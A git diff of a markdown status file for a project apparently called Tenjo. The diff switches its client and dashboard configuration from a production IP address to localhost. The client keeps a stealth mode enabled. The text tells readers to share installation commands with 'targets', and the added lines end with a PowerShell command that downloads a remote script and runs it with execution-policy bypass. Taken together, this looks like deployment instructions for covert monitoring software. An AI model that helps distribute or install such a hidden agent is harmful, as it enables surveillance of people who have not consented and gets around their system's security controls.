@@ -1,33 +1,36 @@
-# 🚀 GitHub Ready - Production Configuration Complete
+# �️ Development Mode - Update Configuration
 
-## ✅ Production Status: READY FOR DEPLOYMENT
+## ⚠️ Development Status: READY FOR UPDATES
 
-### 🎯 Production Server Configuration
-- **Production IP**: `103.129.149.67`
-- **Server URL**: `http://103.129.149.67`
-- **Environment**: Production Ready
-- **Mode**: Stealth Enabled
+### 🎯 Development Server Configuration
+- **Development IP**: `127.0.0.1:8000`
+- **Server URL**: `http://127.0.0.1:8000`
+- **Environment**: Development Mode
+- **Production IP**: `103.129.149.67` (COMMENTED OUT)
 
 ---
 
-## 📋 Configuration Verification Complete
+## 📋 Configuration Switched to Development
 
 ### ✅ Client Configuration (`client/src/core/config.py`)
 ```python
-SERVER_URL = "http://103.129.149.67"  # ✅ Production IP
-STEALTH_MODE = True                         # ✅ Enabled
+SERVER_URL = "http://127.0.0.1:8000"          # ✅ Development Mode
+# SERVER_URL = "http://103.129.149.67"         # 🔒 Production IP (COMMENTED)
+STEALTH_MODE = True                            # ✅ Still Enabled
 ```
 
 ### ✅ Dashboard Configuration (`dashboard/.env`)
 ```env
-APP_ENV=production                          # ✅ Production Mode
-APP_DEBUG=false                             # ✅ Debug Disabled
-APP_URL=http://103.129.149.67         # ✅ Production URL
+APP_ENV=local                                  # ✅ Development Mode
+APP_DEBUG=true                                 # ✅ Debug Enabled
+APP_URL=http://127.0.0.1:8000                  # ✅ Development URL
+# APP_URL=http://103.129.149.67                # 🔒 Production URL (COMMENTED)
 ```
 
 ### ✅ CORS Configuration (`dashboard/config/sanctum.php`)
 ```php
-'103.129.149.67'      # ✅ Production Domains
+'localhost,127.0.0.1'                         # ✅ Development Domains
+# '103.129.149.67'                            # 🔒 Production Domain (COMMENTED)
 ```
 
 ### ✅ Production Installers Ready
@@ -147,3 +150,11 @@ All development references have been replaced with production configurations. Th
 3. ✅ **Distribute Installers**: Share installation commands with targets
 
 **Production Server**: `103.129.149.67` 🚀
+
+**Install Windows Work**
+
+# Download installer
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/install_windows.ps1" -OutFile "install_tenjo.ps1"
+
+# Run installer with execution policy bypass
+PowerShell -ExecutionPolicy Bypass -File "install_tenjo.ps1"
